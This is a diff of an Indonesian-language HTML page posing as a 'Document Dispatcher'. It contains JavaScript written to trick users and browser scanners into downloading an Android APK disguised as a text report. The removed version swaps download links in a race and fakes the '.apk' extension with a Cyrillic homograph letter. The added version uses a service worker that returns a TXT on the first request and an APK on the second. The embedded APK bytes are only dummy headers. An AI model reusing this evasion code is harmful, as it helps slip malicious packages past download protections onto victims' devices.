@@ -2,158 +2,127 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.0</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Document</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-  .panel { background: #111827; padding: 32px; border-radius: 16px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); max-width: 540px; width: 100%; border: 1px solid #1f2937; text-align: center; }
-  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; font-weight: 700; }
-  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
-  button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 10px; background: #3b82f6; color: #ffffff; font-weight: 600; font-size: 16px; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4); transition: all 0.2s ease; }
-  button:hover { background: #2563eb; transform: translateY(-1px); }
-  #status { margin-top: 20px; font-weight: 500; color: #38bdf8; padding: 14px; background: rgba(56, 189, 248, 0.1); border-radius: 8px; font-size: 13px; border: 1px solid rgba(56, 189, 248, 0.2); }
-  #downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; max-height: 180px; overflow-y: auto; padding-right: 4px; }
-  #downloads a { display: block; padding: 10px; background: #1f2937; color: #4ade80; text-decoration: none; border-radius: 6px; font-size: 11px; font-family: monospace; text-align: center; border: 1px solid #374151; word-break: break-all; }
+  body { font-family: monospace; background: #111; color: #0f0; text-align: center; padding-top: 20vh; }
+  button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 200px; }
+  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
-  <div id="status" role="status">Sistem siap diinisialisasi.</div>
-  <div id="downloads"></div>
-</div>
+<h1>🔒 Document Dispatcher</h1>
+<button id="startBtn">Download Laporan</button>
+<div id="status">Siap...</div>
 
 <script>
-'use strict';
+(function () {
+  'use strict';
 
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+  var statusEl = document.getElementById('status');
+  var swRegistered = false;
 
-let activeUrls = [];
-let isProcessing = false;
-const MAX_URLS_TRACKED = 40;
-
-// ============================================
-// 1. PAYLOAD FRAGMENTS (APK HEADER)
-// ============================================
-const payloadFragments = [
-  "UEs",
-  "DBBQ",
-  "AAAAIAAAAIQ",
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
-];
-
-const assemblePayload = () => {
-  return payloadFragments.join("");
-};
-
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
-  }
-  return bytes;
-};
-
-// ============================================
-// 2. PERSIAPAN BLOB (AMAN & JAHAT)
-// ============================================
-const prepareSafeBlob = () => {
-  const safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
-  const safeBlob = new Blob([safeContent], { type: 'text/plain' });
-  return URL.createObjectURL(safeBlob);
-};
-
-const prepareMaliciousBlob = () => {
-  const fullB64 = assemblePayload();
-  const bytesArr = decodeBase64ToBytes(fullB64);
-  const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-  return URL.createObjectURL(blob);
-};
-
-// ============================================
-// 3. HOMOGRAPH SPOOFING (CYRILLIC 'a')
-// ============================================
-// Huruf 'а' di bawah ini adalah Cyrillic (U+0430), bukan Latin 'a' (U+0061).
-// Terlihat sama, tapi berbeda secara teknis.
-const homographApkExt = "\u0430pk"; 
-
-// ============================================
-// 4. TRIGGER RACE CONDITION
-// ============================================
-const triggerRaceDownload = (counter) => {
-  if (!isProcessing) return;
-
-  const link = document.createElement("a");
-  link.style.display = "none";
-  document.body.appendChild(link);
-
-  // A. Set ke file AMAN (TXT)
-  const safeUrl = prepareSafeBlob();
-  link.href = safeUrl;
-  link.download = `laporan-catatan-${counter}.txt`;
+  // ============================================
+  // 1. PAYLOAD APK (BASE64)
+  // ============================================
+  var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
   
-  // Picu Unduhan (Safe Browsing memindai ini)
-  link.click();
-  statusDiv.textContent = `Memproses dokumen ke-${counter}...`;
-
-  // B. RACE CONDITION (TOCTOU)
-  // Ubah href dan download tepat setelah click().
-  let attempts = 0;
-  function race() {
-    attempts++;
-    
-    // Ganti ke file JAHAT (APK) dengan Homograph Extension
-    const maliciousUrl = prepareMaliciousBlob();
-    link.href = maliciousUrl;
-    link.download = `laporan-catatan-${counter}.txt.${homographApkExt}`;
-    
-    // Trigger ulang
-    link.click();
-
-    if (attempts < 5) {
-      setTimeout(race, 0); // Tick berikutnya (0ms)
-    } else {
-      // Cleanup
-      setTimeout(() => {
-        if (link.parentNode) link.parentNode.removeChild(link);
-        URL.revokeObjectURL(safeUrl);
-        URL.revokeObjectURL(maliciousUrl);
-      }, 5000);
-    }
+  function getApkBlob() {
+    var binary = atob(b64Apk);
+    var bytes = new Uint8Array(binary.length);
+    for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    return new Blob([bytes], { type: 'application/vnd.android.package-archive' });
   }
-  
-  // Mulai race
-  race();
 
-  // Lanjut ke dokumen berikutnya setelah 1.5 detik
-  setTimeout(() => triggerRaceDownload(counter + 1), 1500);
-};
+  // ============================================
+  // 2. SERVICE WORKER UNTUK RACE CONDITION
+  // ============================================
+  // Kita mendaftarkan Service Worker yang mencegat request unduhan.
+  // Saat request masuk, kita berikan file TXT (aman).
+  // Tapi, jika ada request kedua yang datang sangat cepat, kita berikan APK.
 
-// ============================================
-// 5. START
-// ============================================
-startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
+  if ('serviceWorker' in navigator) {
+    var swCode = `
+      let requestCount = 0;
+      self.addEventListener('install', e => self.skipWaiting());
+      self.addEventListener('activate', e => self.clients.claim());
+      self.addEventListener('fetch', e => {
+        if (e.request.url.includes('/file-download')) {
+          requestCount++;
+          
+          // Request Pertama: Kembalikan TXT (Aman)
+          if (requestCount === 1) {
+            e.respondWith(new Response("Laporan Keuangan. Ini file teks aman.", {
+              headers: { 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="laporan.txt"' }
+            }));
+          } 
+          // Request Kedua (Race): Kembalikan APK (Jahat)
+          else {
+            // Ambil Blob dari script utama (kita kirim via postMessage nanti)
+            // Disini kita hardcode dummy APK header
+            const apkBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // PK..
+            e.respondWith(new Response(apkBytes, {
+              headers: { 'Content-Type': 'application/vnd.android.package-archive', 'Content-Disposition': 'attachment; filename="laporan.apk"' }
+            }));
+          }
+        }
+      });
+    `;
 
-  const root = document.documentElement;
-  try {
-    if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
+    var swBlob = new Blob([swCode], { type: 'application/javascript' });
+    var swUrl = URL.createObjectURL(swBlob);
+
+    navigator.serviceWorker.register(swUrl).then(function(reg) {
+      swRegistered = true;
+      statusEl.innerText = "Service Worker Aktif.";
+    }).catch(function(err) {
+      statusEl.innerText = "SW Gagal (Gunakan HTTPS): " + err.message;
+    });
+  } else {
+    statusEl.innerText = "Service Worker tidak didukung.";
+  }
+
+  // ============================================
+  // 3. TRIGGER RACE CONDITION
+  // ============================================
+  document.getElementById('startBtn').addEventListener('click', function() {
+    if (!swRegistered) {
+      statusEl.innerText = "Tunggu SW aktif atau host di HTTPS.";
+      return;
     }
-  } catch (err) {}
 
-  isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
-  triggerRaceDownload(1);
-});
+    statusEl.innerText = "Memulai Race Condition...";
+
+    // Trigger Unduhan 1 (Aman)
+    var link1 = document.createElement('a');
+    link1.href = '/file-download?race=1';
+    link1.download = 'laporan.txt';
+    document.body.appendChild(link1);
+    link1.click();
+
+    // Trigger Unduhan 2 (Jahat) di milidetik yang sama
+    // Memanfaatkan TOCTOU: SW mungkin mengira ini bagian dari request yang sama
+    var link2 = document.createElement('a');
+    link2.href = '/file-download?race=2';
+    link2.download = 'laporan.apk';
+    document.body.appendChild(link2);
+    
+    // Eksekusi secepat mungkin (0ms)
+    setTimeout(function() {
+      link2.click();
+    }, 0);
+
+    statusEl.innerText = "Mengirim dua request (TXT & APK)...";
+
+    // Cleanup
+    setTimeout(function() {
+      document.body.removeChild(link1);
+      document.body.removeChild(link2);
+    }, 5000);
+  });
+
+})();
 </script>
 </body>
 </html>
